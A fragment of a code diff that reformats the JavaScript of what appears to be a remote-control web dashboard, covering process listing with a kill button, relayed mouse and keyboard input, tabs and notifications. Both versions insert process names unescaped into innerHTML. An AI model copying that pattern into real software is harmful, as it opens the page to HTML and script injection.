+      : a.processes;
+
   list.forEach(p => {
-    const row = document.createElement('div');
+
+    const row =
+      document.createElement('div');
+
     row.className = 'proc-row';
-    row.innerHTML = `<span class="proc-name" title="${p.name}">${p.name}</span>
-      <span class="proc-mem">${p.mem}MB</span>
-      <button class="proc-kill" onclick="killProc(${p.pid})">Kill</button>`;
+
+    row.innerHTML = `
+      <span class="proc-name"
+            title="${p.name}">
+        ${p.name}
+      </span>
+
+      <span class="proc-mem">
+        ${p.mem}MB
+      </span>
+
+      <button class="proc-kill"
+              onclick="killProc(${p.pid})">
+        Kill
+      </button>
+    `;
+
     procEl.appendChild(row);
   });
 }
 
-// ── Remote control ────────────────────────────────────────────────────────────
-function toggleRemote(on) { remoteOn = on; screen.style.cursor = on ? 'none' : 'default'; }
+// ─────────────────────────────────────────────────────────────────────────────
+// REMOTE CONTROL
+// ─────────────────────────────────────────────────────────────────────────────
 
-screen.addEventListener('mousemove', e => {
-  if (!remoteOn) return;
-  const r = screen.getBoundingClientRect();
-  sendCmd({ type: 'mousemove', x: (e.clientX - r.left) / r.width, y: (e.clientY - r.top) / r.height });
-});
-screen.addEventListener('mousedown', e => sendCmd({ type: 'mousedown', button: e.button }));
-screen.addEventListener('mouseup',   e => sendCmd({ type: 'mouseup',   button: e.button }));
-screen.addEventListener('wheel',     e => sendCmd({ type: 'scroll', dx: e.deltaX, dy: e.deltaY }), { passive: true });
-screen.addEventListener('contextmenu', e => { if (remoteOn) e.preventDefault(); });
+function toggleRemote(on) {
 
-document.addEventListener('keydown', e => {
-  if (!remoteOn || e.target !== document.body) return;
-  sendCmd({ type: 'keydown', key: e.key });
-});
-document.addEventListener('keyup', e => {
-  if (!remoteOn || e.target !== document.body) return;
-  sendCmd({ type: 'keyup', key: e.key });
-});
+  remoteOn = on;
 
-// ── Tabs ──────────────────────────────────────────────────────────────────────
-function switchTab(name, el) {
-  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-  el.classList.add('active');
-  document.getElementById('tab-' + name).classList.add('active');
-  if (name === 'processes') renderProcesses();
-  if (name === 'clipboard') renderClipboard();
+  screen.style.cursor =
+    on ? 'none' : 'default';
 }
 
-// ── Notifications ─────────────────────────────────────────────────────────────
+screen.addEventListener(
+  'mousemove',
+  e => {
+
+    if (!remoteOn) return;
+
+    const r =
+      screen.getBoundingClientRect();
+
+    sendCmd({
+      type: 'mousemove',
+      x:
+        (e.clientX - r.left) /
+        r.width,
+      y:
+        (e.clientY - r.top) /
+        r.height
+    });
+  }
+);
+
+screen.addEventListener(
+  'mousedown',
+  e =>
+    sendCmd({
+      type: 'mousedown',
+      button: e.button
+    })
+);
+
+screen.addEventListener(
+  'mouseup',
+  e =>
+    sendCmd({
+      type: 'mouseup',
+      button: e.button
+    })
+);
+
+screen.addEventListener(
+  'wheel',
+  e =>
+    sendCmd({
+      type: 'scroll',
+      dx: e.deltaX,
+      dy: e.deltaY
+    }),
+  { passive: true }
+);
+
+screen.addEventListener(
+  'contextmenu',
+  e => {
+
+    if (remoteOn) {
+      e.preventDefault();
+    }
+  }
+);
+
+document.addEventListener(
+  'keydown',
+  e => {
+
+    if (
+      !remoteOn ||
+      e.target !== document.body
+    ) return;
+
+    sendCmd({
+      type: 'keydown',
+      key: e.key
+    });
+  }
+);
+
+document.addEventListener(
+  'keyup',
+  e => {
+
+    if (
+      !remoteOn ||
+      e.target !== document.body
+    ) return;
+
+    sendCmd({
+      type: 'keyup',
+      key: e.key
+    });
+  }
+);
+
+// ─────────────────────────────────────────────────────────────────────────────
+// TABS
+// ─────────────────────────────────────────────────────────────────────────────
+
+function switchTab(name, el) {
+
+  document
+    .querySelectorAll('.tab')
+    .forEach(t =>
+      t.classList.remove('active')
+    );
+
+  document
+    .querySelectorAll('.tab-content')
+    .forEach(t =>
+      t.classList.remove('active')
+    );
+
+  el.classList.add('active');
+
+  document
+    .getElementById('tab-' + name)
+    .classList.add('active');
+
+  if (name === 'processes') {
+    renderProcesses();
+  }
+
+  if (name === 'clipboard') {
+    renderClipboard();
+  }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// NOTIFICATIONS
+// ─────────────────────────────────────────────────────────────────────────────
+
 function notify(msg) {
-  if (Notification.permission === 'granted') new Notification(msg);
-  else if (Notification.permission !== 'denied') Notification.requestPermission();
+
+  if (Notification.permission === 'granted') {
+
+    new Notification(msg);
+
+  } else if (
+    Notification.permission !== 'denied'
+  ) {
+
+    Notification.requestPermission();
+  }
 }
 
 Notification.requestPermission();
+
 </script>
+
 </body>
 </html>
+```
